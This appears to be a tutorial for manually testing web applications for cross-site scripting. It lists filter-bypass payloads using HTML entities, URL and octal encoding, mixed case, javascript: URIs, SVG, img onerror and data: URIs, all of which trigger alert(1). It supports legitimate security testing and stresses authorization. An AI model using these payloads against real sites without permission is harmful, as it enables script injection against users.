# XSS Testing Guide
This guide provides step-by-step instructions to manually test for XSS vulnerabilities in web applications. XSS vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. Use this guide to test whitelisted or blacklisted elements, character encoding, and potential bypass vectors.
<br />
<h3>Prerequisites</h3>
Before testing, ensure you have:<br />
1. Access to the web application you want to test<br />
2. Basic knowledge of web technologies such as HTML, JavaScript, and URL encoding<br />
3. Appropriate permissions to perform security testing on the target website (legal or authorized engagement)<br />
<h1>Steps for Testing XSS Vulnerabilities</h1>

<b>1. Identify Whitelisted or Blacklisted Characters</b>
Begin by identifying if the application uses a whitelist or blacklist to filter specific characters. This will give you an idea of what input is allowed or blocked.<br />

<b>2. Test Basic HTML Characters</b>
Check if basic HTML characters such as < and > are allowed or encoded. These characters are essential for creating HTML elements.<br />
1. <<br />
2. ><br />
3. &lt   <!-- HTML entity for < --><br />
4. &gt   <!-- HTML entity for > --><br />
<b>Example Test Payloads:</b><br />
&lt;script&gt;alert(1)&lt;/script&gt;<br />
&ltscript&gtalert(1)&lt/script&gt<br />

<b>3. Test URL-Encoded Characters</b>
Many web applications automatically encode special characters in URLs. Try common URL-encoded representations to see if they are accepted or blocked.<br />
5. %3c    <!-- URL encoding for < --><br />
6. %3e    <!-- URL encoding for > --><br />
<b>Example Test Payloads:</b><br />
%3cscript%3ealert(1)%3c/script%3e<br />
<b>4. Test javascript: URI Scheme</b><br />
The javascript: URI scheme is commonly used in XSS attacks. Check if this scheme is blacklisted or if the application allows it in href or src attributes.<br />
7. javascript:<br />
8. JAVASCRIPT:    <!-- Test for case-insensitivity --><br />
<b>Example Test Payloads:</b><br />
&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;<br />
<b>5. Test Octal Encoded Characters</b><br />
Test octal representations of characters like < and > to see if the application interprets them correctly or allows them through.<br />

9. \74    <!-- Octal encoding for < --><br />
10. \76   <!-- Octal encoding for > --><br />
<b>Example Test Payload:</b>
\74script\76alert(1)\74/script\76<br />
<b>6. Test Mixed Encodings</b><br />
Test mixed encodings to see if the filter can catch them. Attackers often use mixed encoding methods to bypass simple filters.<br />

11. %3cSCRipt%3e    <!-- Mixed encoding with capital letters --><br />
<b>Example Test Payloads:</b><br />
%3cSCRipt%3ealert(1)%3c/SCRipt%3e<br />
<b>7. Test SVG Injection</b><br />
SVG elements can be a source of XSS, particularly in modern web applications. Test encoded versions of SVG elements to see if they trigger XSS.<br />

<b>12. &lt;%3cSVg%3e&gt;</b>    <!-- Encoded SVG elements --><br />
<b>Example Test Payload:</b><br />
<svg><script>alert(1)</script></svg><br />
<b>8. Continue Testing with Various Encodings</b><br />
Extend your testing by experimenting with various encodings, bypass methods, and payloads that combine different attack vectors.<br />

13. and so on.<br />
Other Example Test Payloads:<br />
data:text/html,<script>alert(1)</script><br />
&lt;img src=x onerror=alert(1)&gt;<br />
&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gr;<br />
<b>Notes</b><br />
Always perform XSS testing in a safe, controlled environment.<br />
Never test live systems without proper authorization.<br />
Some payloads might behave differently based on the browser's built-in security features (e.g., CSP or XSS filters).<br />
By following these steps, you can identify potential XSS vulnerabilities and understand how web applications handle whitelisted or blacklisted characters and encodings. Remember to document your findings and share your results responsibly with the application owner.
